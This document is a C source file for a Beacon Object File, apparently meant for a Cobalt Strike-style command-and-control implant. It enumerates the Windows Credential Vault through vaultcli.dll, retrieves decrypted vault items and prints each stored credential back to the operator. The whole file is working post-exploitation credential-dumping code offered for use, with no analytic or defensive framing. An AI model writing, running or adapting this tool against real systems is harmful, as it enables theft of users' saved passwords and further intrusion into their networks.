/*
 * windowsvault.c — BOF: enumerate Windows Credential Vault (vaultcli.dll)
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT void BeaconPrintf(int type, char *fmt, ...);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME *, LPSYSTEMTIME);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR *);
DECLSPEC_IMPORT LONG    NTAPI  NTDLL$RtlGetVersion(PRTL_OSVERSIONINFOW);

typedef enum _VAULT_ELEMENT_TYPE {
    VaultElementTypeUndefined      = -1,
    VaultElementTypeBoolean        = 0,
    VaultElementTypeShort          = 1,
    VaultElementTypeUnsignedShort  = 2,
    VaultElementTypeInt            = 3,
    VaultElementTypeUnsignedInt    = 4,
    VaultElementTypeDouble         = 5,
    VaultElementTypeGuid           = 6,
    VaultElementTypeString         = 7,
    VaultElementTypeSid            = 8,
    VaultElementTypeByteArray      = 9,
    VaultElementTypeTimeStamp      = 10,
    VaultElementTypeProtectedArray = 11,
    VaultElementTypeAttribute      = 12,
    VaultElementTypeLast           = 14
} VAULT_ELEMENT_TYPE;

typedef struct _VAULT_BYTE_ARRAY {
    DWORD Length;
    PBYTE pData;
} VAULT_BYTE_ARRAY;

#pragma pack(push, 8)

typedef struct _VAULT_ITEM_WIN8 {
    GUID     SchemaId;
    PWSTR    pszCredentialFriendlyName;
    LPVOID   pResourceElement;
    LPVOID   pIdentityElement;
    LPVOID   pAuthenticatorElement;
    LPVOID   pPackageSid;
    FILETIME LastModified;
    DWORD    dwFlags;
    DWORD    dwPropertiesCount;
    LPVOID   pProperties;
} VAULT_ITEM_WIN8;

typedef struct _VAULT_ITEM_WIN7 {
    GUID     SchemaId;
    PWSTR    pszCredentialFriendlyName;
    LPVOID   pResourceElement;
    LPVOID   pIdentityElement;
    LPVOID   pAuthenticatorElement;
    FILETIME LastModified;
    DWORD    dwFlags;
    DWORD    dwPropertiesCount;
    LPVOID   pProperties;
} VAULT_ITEM_WIN7;

#pragma pack(pop)

typedef DWORD (WINAPI *pfnVaultEnumerateVaults)(DWORD, LPDWORD, LPGUID *);
typedef DWORD (WINAPI *pfnVaultOpenVault)(LPGUID, DWORD, LPVOID *);
typedef DWORD (WINAPI *pfnVaultEnumerateItems)(LPVOID, DWORD, LPDWORD, LPVOID *);
typedef DWORD (WINAPI *pfnVaultGetItem_WIN8)(LPVOID, LPGUID, LPVOID, LPVOID, LPVOID, HWND, DWORD, LPVOID *);
typedef DWORD (WINAPI *pfnVaultGetItem_WIN7)(LPVOID, LPGUID, LPVOID, LPVOID, HWND, DWORD, LPVOID *);
typedef DWORD (WINAPI *pfnVaultFree)(LPVOID);
typedef DWORD (WINAPI *pfnVaultCloseVault)(LPVOID *);

typedef struct { GUID guid; LPCSTR name; } VAULT_SCHEMA;

static const VAULT_SCHEMA g_Schemas[] = {
    { {0x2F1A6504,0x0641,0x44CF,{0x8B,0xB5,0x36,0x12,0xD8,0x65,0xF2,0xE5}}, "Windows Secure Note"                  },
    { {0x3CCD5499,0x87A8,0x4B10,{0xA2,0x15,0x60,0x88,0x88,0xDD,0x3B,0x55}}, "Windows Web Password Credential"       },
    { {0x154E23D0,0xC644,0x4E6F,{0x8C,0xE6,0x50,0x69,0x27,0x2F,0x99,0x9F}}, "Windows Credential Picker Protector"   },
    { {0x4BF4C442,0x9B8A,0x41A0,{0xB3,0x80,0xDD,0x4A,0x70,0x4D,0xDB,0x28}}, "Web Credentials"                      },
    { {0x77BC582B,0xF0A6,0x4E15,{0x4E,0x80,0x61,0x73,0x6B,0x6F,0x3B,0x29}}, "Windows Credentials"                  },
    { {0xE69D7838,0x91B5,0x4FC9,{0x89,0xD5,0x23,0x0D,0x4D,0x4C,0xC2,0xBC}}, "Windows Domain Certificate Credential" },
    { {0x3E0E35BE,0x1B77,0x43E7,{0xB8,0x73,0xAE,0xD9,0x01,0xB6,0x27,0x5B}}, "Windows Domain Password Credential"   },
    { {0x3C886FF3,0x2669,0x4AA2,{0xA8,0xFB,0x3F,0x67,0x59,0xA7,0x75,0x48}}, "Windows Extended Credential"          },
};

static BOOL GuidEqual(const GUID *a, const GUID *b) {
    const ULONGLONG *la = (const ULONGLONG *)a;
    const ULONGLONG *lb = (const ULONGLONG *)b;
    return (la[0] == lb[0] && la[1] == lb[1]);
}

static LPCSTR LookupSchema(const GUID *g) {
    int n = sizeof(g_Schemas) / sizeof(g_Schemas[0]);
    for (int i = 0; i < n; i++) {
        if (GuidEqual(g, &g_Schemas[i].guid))
            return g_Schemas[i].name;
    }
    return "(unknown schema)";
}

/* ── Element value printer ──────────────────────────────────────────────── */
static void PrintElement(LPVOID pElem, LPCSTR label) {
    if (!pElem) {
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (null)", label);
        return;
    }

    /* 
     * VAULT_ITEM_ELEMENT layout (discovered from raw dump):
     *   offset  0-7 : unknown field (ULONGLONG)
     *   offset  8-11: VAULT_ELEMENT_TYPE (the actual type!)
     *   offset 12-15: padding
     *   offset 16+  : data (pointer for large types, inline for small types)
     */
    VAULT_ELEMENT_TYPE type = *(VAULT_ELEMENT_TYPE *)((BYTE *)pElem + 8);
    
    /* Data pointer at offset 16 */
    LPVOID *ppData = (LPVOID *)((BYTE *)pElem + 16);
    LPVOID  pData  = *ppData;
    
    char buf[1024] = {0};
    static const char hexChars[] = "0123456789ABCDEF";

    switch (type) {

    case VaultElementTypeString: {
        /* String: offset 16 contains pointer to wide string */
        PWSTR wstr = (PWSTR)pData;
        if (wstr) {
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buf, sizeof(buf) - 1, NULL, NULL);
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %s", label, buf);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (empty string)", label);
        }
        break;
    }

    case VaultElementTypeSid: {
        PSID sid = (PSID)pData;
        LPSTR sidStr = NULL;
        if (sid && ADVAPI32$ConvertSidToStringSidA(sid, &sidStr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %s", label, sidStr);
            KERNEL32$LocalFree((HLOCAL)sidStr);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (invalid SID)", label);
        }
        break;
    }

    case VaultElementTypeByteArray: {
        /* ByteArray: offset 16 contains VAULT_BYTE_ARRAY struct */
        VAULT_BYTE_ARRAY *ba = (VAULT_BYTE_ARRAY *)ppData;
        if (ba->pData && ba->Length > 0) {
            int printLen = (ba->Length > 32) ? 32 : ba->Length;
            char hexBuf[128] = {0};
            char *p = hexBuf;
            for (int i = 0; i < printLen; i++) {
                *p++ = hexChars[(ba->pData[i] >> 4) & 0x0F];
                *p++ = hexChars[ba->pData[i] & 0x0F];
                *p++ = ' ';
            }
            *p = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: [%u bytes] %s%s", 
                         label, ba->Length, hexBuf, 
                         (ba->Length > 32) ? "..." : "");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (empty byte array)", label);
        }
        break;
    }

    case VaultElementTypeBoolean:
        /* Boolean: inline at offset 16 */
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %s", 
                     label, *(BOOL *)ppData ? "true" : "false");
        break;

    case VaultElementTypeShort:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %d", 
                     label, *(short *)ppData);
        break;

    case VaultElementTypeUnsignedShort:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %u", 
                     label, *(unsigned short *)ppData);
        break;

    case VaultElementTypeInt:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %d", 
                     label, *(int *)ppData);
        break;

    case VaultElementTypeUnsignedInt:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: %u", 
                     label, *(unsigned int *)ppData);
        break;

    case VaultElementTypeGuid: {
        GUID *g = (GUID *)pData;
        if (g) {
            BeaconPrintf(CALLBACK_OUTPUT, 
                         "      %-12s: {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                         label, g->Data1, g->Data2, g->Data3,
                         g->Data4[0], g->Data4[1], g->Data4[2], g->Data4[3],
                         g->Data4[4], g->Data4[5], g->Data4[6], g->Data4[7]);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (null GUID)", label);
        }
        break;
    }

    case VaultElementTypeTimeStamp: {
        FILETIME *ft = (FILETIME *)pData;
        if (ft) {
            SYSTEMTIME st;
            if (KERNEL32$FileTimeToSystemTime(ft, &st)) {
                BeaconPrintf(CALLBACK_OUTPUT, 
                             "      %-12s: %04d-%02d-%02d %02d:%02d:%02d",
                             label, st.wYear, st.wMonth, st.wDay,
                             st.wHour, st.wMinute, st.wSecond);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (invalid timestamp)", label);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (null timestamp)", label);
        }
        break;
    }

    default:
        BeaconPrintf(CALLBACK_OUTPUT, "      %-12s: (type %d unhandled)", label, (int)type);
        break;
    }
}

/* ── BOF entry point ────────────────────────────────────────────────────── */
void go(char *args, int alen) {

    RTL_OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    NTDLL$RtlGetVersion(&osvi);
    BOOL bWin8Plus = (osvi.dwMajorVersion > 6) ||
                     (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion >= 2);

    HMODULE hVaultLib = KERNEL32$LoadLibraryA("vaultcli.dll");
    if (!hVaultLib) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load vaultcli.dll");
        return;
    }

    pfnVaultEnumerateVaults VaultEnumerateVaults =
        (pfnVaultEnumerateVaults)KERNEL32$GetProcAddress(hVaultLib, "VaultEnumerateVaults");
    pfnVaultOpenVault VaultOpenVault =
        (pfnVaultOpenVault)KERNEL32$GetProcAddress(hVaultLib, "VaultOpenVault");
    pfnVaultEnumerateItems VaultEnumerateItems =
        (pfnVaultEnumerateItems)KERNEL32$GetProcAddress(hVaultLib, "VaultEnumerateItems");
    pfnVaultFree VaultFree =
        (pfnVaultFree)KERNEL32$GetProcAddress(hVaultLib, "VaultFree");
    pfnVaultCloseVault VaultCloseVault =
        (pfnVaultCloseVault)KERNEL32$GetProcAddress(hVaultLib, "VaultCloseVault");

    FARPROC pfnGetItem = KERNEL32$GetProcAddress(hVaultLib, "VaultGetItem");
    pfnVaultGetItem_WIN8 VaultGetItem_WIN8 = (pfnVaultGetItem_WIN8)pfnGetItem;
    pfnVaultGetItem_WIN7 VaultGetItem_WIN7 = (pfnVaultGetItem_WIN7)pfnGetItem;

    if (!VaultEnumerateVaults || !VaultOpenVault || !VaultEnumerateItems ||
        !VaultFree || !VaultCloseVault || !pfnGetItem) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resolve vaultcli.dll exports");
        KERNEL32$FreeLibrary(hVaultLib);
        return;
    }

    DWORD  vaultCount  = 0;
    LPGUID pVaultGuids = NULL;
    DWORD  res = VaultEnumerateVaults(0, &vaultCount, &pVaultGuids);
    if (res != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VaultEnumerateVaults failed: 0x%08X", res);
        KERNEL32$FreeLibrary(hVaultLib);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] Windows Vault Enumeration\n"
        "    OS: %s | Vaults found: %u\n",
        bWin8Plus ? "Win8+" : "Win7",
        vaultCount);

    for (DWORD i = 0; i < vaultCount; i++) {

        GUID   *pGuid      = &pVaultGuids[i];
        LPCSTR  schemaName = LookupSchema(pGuid);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n  [Vault %u]",
            i);
        BeaconPrintf(CALLBACK_OUTPUT,
            "    GUID : {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            pGuid->Data1, pGuid->Data2, pGuid->Data3,
            pGuid->Data4[0], pGuid->Data4[1],
            pGuid->Data4[2], pGuid->Data4[3], pGuid->Data4[4],
            pGuid->Data4[5], pGuid->Data4[6], pGuid->Data4[7]);
        BeaconPrintf(CALLBACK_OUTPUT,
            "    Type : %s", schemaName);

        LPVOID hVaultHandle = NULL;
        res = VaultOpenVault(pGuid, 0, &hVaultHandle);
        if (res != 0) {
            BeaconPrintf(CALLBACK_ERROR, "    [!] VaultOpenVault failed: 0x%08X", res);
            continue;
        }

        DWORD  itemCount = 0;
        LPVOID pItems    = NULL;
        res = VaultEnumerateItems(hVaultHandle, 512, &itemCount, &pItems);
        if (res != 0) {
            BeaconPrintf(CALLBACK_ERROR, "    [!] VaultEnumerateItems failed: 0x%08X", res);
            VaultCloseVault(&hVaultHandle);
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "    Items: %u", itemCount);

        if (itemCount == 0) {
            VaultFree(pItems);
            VaultCloseVault(&hVaultHandle);
            continue;
        }

        SIZE_T itemSize = bWin8Plus ? sizeof(VAULT_ITEM_WIN8) : sizeof(VAULT_ITEM_WIN7);
        BYTE  *pCurrent = (BYTE *)pItems;

        for (DWORD j = 0; j < itemCount; j++, pCurrent += itemSize) {

            BeaconPrintf(CALLBACK_OUTPUT, "\n    --- Item %u ---", j);

            LPVOID pDecrypted = NULL;
            GUID  *pSchemaId;
            LPVOID pResource;
            LPVOID pIdentity;
            LPVOID pPackageSid = NULL;
            LPVOID pCredential = NULL;

            if (bWin8Plus) {
                VAULT_ITEM_WIN8 *item = (VAULT_ITEM_WIN8 *)pCurrent;
                pSchemaId   = &item->SchemaId;
                pResource   = item->pResourceElement;
                pIdentity   = item->pIdentityElement;
                pPackageSid = item->pPackageSid;

                res = VaultGetItem_WIN8(hVaultHandle, pSchemaId,
                                        pResource, pIdentity, pPackageSid,
                                        NULL, 0, &pDecrypted);
                if (res != 0 || !pDecrypted) {
                    BeaconPrintf(CALLBACK_ERROR, "      VaultGetItem failed: 0x%08X", res);
                    continue;
                }

                pCredential = ((VAULT_ITEM_WIN8 *)pDecrypted)->pAuthenticatorElement;

            } else {
                VAULT_ITEM_WIN7 *item = (VAULT_ITEM_WIN7 *)pCurrent;
                pSchemaId = &item->SchemaId;
                pResource = item->pResourceElement;
                pIdentity = item->pIdentityElement;

                res = VaultGetItem_WIN7(hVaultHandle, pSchemaId,
                                        pResource, pIdentity,
                                        NULL, 0, &pDecrypted);
                if (res != 0 || !pDecrypted) {
                    BeaconPrintf(CALLBACK_ERROR, "      VaultGetItem failed: 0x%08X", res);
                    continue;
                }

                pCredential = ((VAULT_ITEM_WIN7 *)pDecrypted)->pAuthenticatorElement;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "      SchemaGuid : {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                         pSchemaId->Data1, pSchemaId->Data2, pSchemaId->Data3,
                         pSchemaId->Data4[0], pSchemaId->Data4[1],
                         pSchemaId->Data4[2], pSchemaId->Data4[3], pSchemaId->Data4[4],
                         pSchemaId->Data4[5], pSchemaId->Data4[6], pSchemaId->Data4[7]);

            PrintElement(pResource,   "Resource");
            PrintElement(pIdentity,   "Identity");
            PrintElement(pPackageSid, "PackageSid");
            PrintElement(pCredential, "Credential");

            if (pDecrypted)
                VaultFree(pDecrypted);
        }

        VaultFree(pItems);
        VaultCloseVault(&hVaultHandle);
    }

    VaultFree(pVaultGuids);
    KERNEL32$FreeLibrary(hVaultLib);
}
